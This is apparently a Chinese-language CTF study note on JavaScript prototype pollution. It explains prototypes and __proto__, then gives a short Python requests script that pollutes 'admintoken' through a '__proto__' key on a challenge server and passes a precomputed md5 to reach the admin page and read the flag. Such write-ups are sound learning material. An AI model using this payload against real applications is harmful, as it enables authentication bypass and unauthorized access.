---
title: 原型链污染
---

在先知社区看了一篇原型链污染的文章，学习了一下。

原型：

原型是function/函数对象（包括构造函数）的一个属性，它定义了函数构造出的对象的公共祖先。通过该函数构造出的对象，可以继承该原型的属性和方法。原型也是对象。

原型链：

原型链是javascript的实现的形式,递归继承原型对象的原型,原型链的顶端是Object的原型。



构造函数、原型和实例的关系：

每个构造函数都有一个原型对象，原型对象都包含一个指向构造函数的指针，而实例都包含一个指向原型对象的内部指针。那么假如我们让原型对象等于另一个类型的实例，结果会怎样？显然，此时的原型对象将包含一个指向另一个原型的指针，相应地，另一个原型中也包含着一个指向另一个构造函数的指针。假如另一个原型又是另一个类型的实例，那么上述关系依然成立。如此层层递进，就构成了实例与原型的链条。这就是所谓的原型链的基本概念。——摘自《javascript高级程序设计》

看着这些概念是很懵的。**看到文章里的这些解释还是会很懵，所以就在b站找了视频看**

还是直接看原型链的一些关系

看张图：![img](https://xzfile.aliyuncs.com/media/upload/picture/20200204170938-121dfaec-472e-1.png)

这里要去看`__proto__`和prototype

那这两个东西是什么呢？

1. `prototype`是一个类的属性，所有类对象在实例化的时候将会拥有`prototype`中的属性和方法

2. 一个对象的`__proto__`属性，指向这个对象所在的类的`prototype`属性

   

   

   这里person实例对象,Person.prototype是原型,原型通过`__proto__`访问原型对象,实例对象继承的就是原型及其原型对象的属性。

   继承的查找过程:

     调用对象属性时, 会查找属性，如果本身没有，则会去`__proto__`中查找，也就是构造函数的显式原型中查找，如果构造函数中也没有该属性，因为构造函数也是对象，也有`__proto__`，那么会去`__proto__`的显式原型中查找，一直到null(**很好说明了原型才是继承的基础**)

这一段我大概理解为：person是通过Person（）构造出来的，person即为对象，而对象的`__proto__`里储存着构造它的函数的prototype，而prototype保存着对应函数里有的相关属性，让后面的一直连接构成一条链，后面的就会继承前面的一些属性





上面大概了解估计就行了吧（其实我还是有点懵的）



再看看原型链污染吧

![image-20210424152733912](https://tcakalr.gitee.io/tc/image-20210424152733912.png)

上面这幅图可以看到一开始我们定义了个a.bar=1，然后我们通过给a.`__proto__`.bar赋值2，然后再创建一个空的b，发现b继承完后的bar值就是我们刚刚赋值的2.

这是因为前面我们修改了a的原型`a.__proto__.bar = 2`，而a是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。

后来，我们又用Object类创建了一个b对象`let b = {}`，b对象自然也有一个bar属性了

通过这个就造成了原型链污染





看道题吧

给了源码

粗略的看了一下，发现利用点

![image-20210505222400626](https://tcakalr.gitee.io/tc/image-20210505222400626.png)

要令admintoken和querytoken存在并且admintoken的md5等于querytoken

<img src="C:\Users\luorui\AppData\Roaming\Typora\typora-user-images\image-20210505230857604.png" alt="微信图片_20210505225304" style="zoom: 67%;" />

通过本地测试发现可以数组赋值然后覆盖上去

写脚本用提前准备的md5值进行写入

```
import requests
a = requests.post('http://47.98.234.232:28005/api',json={'row':'__proto__','col':'admintoken','data':'abc'})
a = requests.get('http://47.98.234.232:28005/admin?querytoken=900150983cd24fb0d6963f7d28e17f72')
print(a.text)
```

![image-20210505225752477](https://tcakalr.gitee.io/tc/image-20210505225752477.png)

读出flag。